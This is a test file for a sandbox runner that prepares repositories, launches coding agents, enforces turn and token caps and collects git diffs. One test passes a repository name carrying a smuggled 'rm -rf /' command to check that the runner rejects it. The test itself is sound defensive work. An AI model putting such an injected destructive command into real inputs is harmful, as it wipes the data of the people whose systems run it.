    expect(await r.runner.begin(TASK, "prepare", { kind: "prepare", repo: "acme/app; rm -rf /", baseBranch: "main", install: null })).toMatchObject({ accepted: false });
    expect(await r.runner.begin("task-0002", "prepare", { kind: "prepare", repo: "acme/app", baseBranch: "main", install: null })).toMatchObject({ accepted: false });
    await r.runner.begin(TASK, "prepare", { kind: "prepare", repo: "acme/app", baseBranch: "main", install: null });
    r.container.finish(0, { baseSha: BASE });
    await r.runner.report();
    expect(await r.runner.begin(TASK, "agent-1", { kind: "agent", spec: "not json" })).toMatchObject({ accepted: false });
    expect(await r.runner.begin(TASK, "checks-1", { kind: "checks", command: [] })).toMatchObject({ accepted: false });
    const noModel = rig(readSandboxOptions({}), null);
    await noModel.runner.begin(TASK, "prepare", { kind: "prepare", repo: "acme/app", baseBranch: "main", install: null });
    noModel.container.finish(0, { baseSha: BASE });
    await noModel.runner.report();
    expect(await noModel.runner.begin(TASK, "agent-1", { kind: "agent", spec: SPEC })).toMatchObject({ accepted: false, reason: "no coder model is configured" });
  });

  it("fails a prepare that recorded no base commit", async () => {
    const r = rig();
    await r.runner.begin(TASK, "prepare", { kind: "prepare", repo: "acme/app", baseBranch: "main", install: null });
    r.container.finish(0);
    expect(await r.runner.report()).toMatchObject({ state: "failed", detail: "the clone recorded no base commit" });
  });

  it("counts model turns in the sandbox's own storage and refuses past the limit", () => {
    const r = rig();
    for (let i = 1; i <= 3; i++) {
      const turn = r.runner.takeTurn(3, 2, 0);
      expect(turn).toMatchObject({ allowed: true, turns: i });
      r.runner.releaseTurn(turn.ticket ?? "", 0);
    }
    expect(r.runner.takeTurn(3, 2, 0)).toEqual({ allowed: false, turns: 3 });
  });

  it("lets options lower the limits but never raise them, or drop the ship flags from the model gate", () => {
    const options = readSandboxOptions({ limits: { maxDiffBytes: 10 * 1024 * 1024, maxFiles: 20, maxModelTurns: 500 }, requiredFlags: [], registryHosts: ["Registry.Example", "not a host"] });
    expect(options.limits).toEqual({ maxDiffBytes: 2 * 1024 * 1024, maxFileBytes: 512 * 1024, maxFiles: 20, maxModelTurns: 80 });
    expect(options.requiredFlags).toEqual(["ship:enabled", "ship:builds_enabled"]);
    expect(options.dailySpendCents).toBe(2000);
    expect(readSandboxOptions({ dailySpendCents: 0 }).dailySpendCents).toBe(0);
    expect(readSandboxOptions({ dailySpendCents: -5 }).dailySpendCents).toBe(2000);
    expect(options.registryHosts).toEqual(["registry.example"]);
  });

  it("reads Claude Code's own verdict and writes OpenCode's config outside the repository", () => {
    expect(CLAUDE_CODE.outcome('{"type":"result","is_error":false}')).toBe("succeeded");
    expect(CLAUDE_CODE.outcome('{"type":"result","is_error":true}')).toBe("failed");
    expect(CLAUDE_CODE.outcome("no result event")).toBe("failed");
    const route = readSandboxOptions({ profile: "opencode", modelApi: "openai" }).model;
    const [config] = OPENCODE.configFiles({ round: "agent", model: CODER, maxTurns: 64, route });
    expect(config?.path.startsWith("/workspace/task/")).toBe(true);
    expect(JSON.parse(config?.content ?? "{}")).toMatchObject({ tools: { webfetch: false, websearch: false }, provider: { ship: { options: { baseURL: "https://api.openai.com/v1", apiKey: PLACEHOLDER_KEY } } } });
    expect(OPENCODE.command({ round: "repair", model: CODER, maxTurns: 16, route })).toEqual(expect.arrayContaining(["opencode", "run", "--model", `ship/${CODER}`]));
  });

  it("keeps rewritten requests and usage parsing within their shapes", async () => {
    expect(rewriteModelRequest("anthropic", { model: "x" }, CODER)).toBeNull();
    expect(rewriteModelRequest("anthropic", { messages: [], max_tokens: 1_000_000 }, CODER)?.max_tokens).toBe(32_000);
    expect(rewriteModelRequest("anthropic", { messages: [] }, CODER)?.max_tokens).toBe(32_000);
    expect(rewriteModelRequest("openai", { messages: [], max_completion_tokens: 500 }, CODER)?.max_completion_tokens).toBe(500);
    // An OpenAI-compatible request always leaves capped, and a cap that is not a whole number is refused.
    expect(rewriteModelRequest("openai", { messages: [] }, CODER)?.max_completion_tokens).toBe(32_000);
    expect(rewriteModelRequest("openai", { messages: [], max_tokens: 1_000_000 }, CODER)).toMatchObject({ max_tokens: 32_000 });
    expect(rewriteModelRequest("openai", { messages: [], max_tokens: 1_000_000 }, CODER)).not.toHaveProperty("max_completion_tokens");
    for (const bad of ["9999", 12.5, 0, -1, null]) expect(rewriteModelRequest("anthropic", { messages: [], max_tokens: bad }, CODER), String(bad)).toBeNull();
    expect(rewriteModelRequest("anthropic", { messages: [], tools: [{ type: "web_search_20250305", name: "w" }], tool_choice: { type: "auto" } }, CODER)).toEqual({ messages: [], model: CODER, max_tokens: 32_000 });
    const usage: TokenUsage = { inputTokens: 0, outputTokens: 0 };
    mergeUsage("anthropic", { type: "ping" }, usage);
    expect(usage).toEqual({ inputTokens: 0, outputTokens: 0 });
    expect(await usageFromBody("anthropic", new Response("not json").body as ReadableStream<Uint8Array>, "application/json")).toBeNull();
  });

  // The collector runs under Node with git, as in the image. These tests run in Node, so the
  // built-in modules are reached through process.getBuiltinModule; the suite's types are Workers'.
  interface NodeBits {
    execFileSync: (file: string, args: string[], options?: Record<string, unknown>) => string;
    mkdtempSync: (prefix: string) => string;
    rmSync: (path: string, options: { recursive: boolean; force: boolean }) => void;
    symlinkSync: (target: string, path: string) => void;
    writeFileSync: (path: string, data: string | Uint8Array) => void;
    readFileSync: (path: string, encoding: "utf8") => string;
    tmpdir: () => string;
  }
  const builtin = (globalThis as unknown as { process?: { getBuiltinModule?: (id: string) => unknown } }).process?.getBuiltinModule;
  const node: NodeBits | null = builtin ? ({ ...(builtin("node:child_process") as object), ...(builtin("node:fs") as object), ...(builtin("node:os") as object) } as NodeBits) : null;
  const join = (...parts: string[]) => parts.join("/");
  const hasGit = (() => {
    try {
      node?.execFileSync("git", ["--version"], { stdio: "ignore" });
      return node !== null;
    } catch {
      return false;
    }
  })();

  it.runIf(hasGit)("produces, with the image's collector, output the Worker accepts", () => {
    if (!node) return;
    const { execFileSync, mkdtempSync, rmSync, symlinkSync, writeFileSync, readFileSync, tmpdir } = node;
    const dir = mkdtempSync(join(tmpdir(), "ship-collect-"));
    try {
      const repo = join(dir, "repo");
      const git = (...args: string[]) => execFileSync("git", ["-c", "commit.gpgsign=false", "-c", "core.hooksPath=/dev/null", "-C", repo, ...args], { encoding: "utf8" });
      execFileSync("git", ["init", "-q", "-b", "main", repo]);
      git("config", "user.email", "ship@acme.example");
      git("config", "user.name", "Acme");
      writeFileSync(join(repo, "a.txt"), "one\ntwo\n");
      writeFileSync(join(repo, "old.md"), "notes\n");
      writeFileSync(join(repo, "gone.txt"), "bye\n");
      writeFileSync(join(repo, ".gitignore"), "node_modules\n");
      git("add", "-A");
      git("commit", "-qm", "base");
      const base = git("rev-parse", "HEAD").trim();
      writeFileSync(join(repo, "a.txt"), "one\nTWO\n");
      git("mv", "old.md", "new.md");
      rmSync(join(repo, "gone.txt"), { recursive: false, force: true });
      writeFileSync(join(repo, "icon.bin"), new Uint8Array([0, 1, 2]));
      symlinkSync("a.txt", join(repo, "link"));
      execFileSync("mkdir", ["-p", join(repo, "node_modules")]);
      writeFileSync(join(repo, "node_modules", "ignored.js"), "x");
      const out = join(dir, "changes.json");
      execFileSync("node", [new URL("./images/shared/ship-collect.mjs", (import.meta as unknown as { url: string }).url).pathname, "--repo", repo, "--base", base, "--out", out, "--max-files", "100", "--max-file-bytes", "524288", "--max-diff-bytes", "2097152"]);
      const result = parseCollected(readFileSync(out, "utf8"), base, { maxDiffBytes: 2097152, maxFileBytes: 524288, maxFiles: 100 });
      expect(result.ok).toBe(true);
      if (!result.ok) return;
      const byPath = Object.fromEntries(result.files.map((f) => [f.path, f]));
      expect(Object.keys(byPath).sort()).toEqual(["a.txt", "gone.txt", "icon.bin", "link", "new.md"]);
      expect(byPath["a.txt"]).toMatchObject({ change: "modified", additions: 1, deletions: 1, content: { encoding: "utf-8", data: "one\nTWO\n" } });
      expect(byPath["gone.txt"]).toMatchObject({ change: "deleted", content: null });
      expect(byPath["icon.bin"]).toMatchObject({ change: "added", binary: true, content: { encoding: "base64", data: "AAEC" } });
      expect(byPath.link).toMatchObject({ mode: "120000", content: { encoding: "utf-8", data: "a.txt" } });
      expect(byPath["new.md"]).toMatchObject({ change: "renamed", previousPath: "old.md" });
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
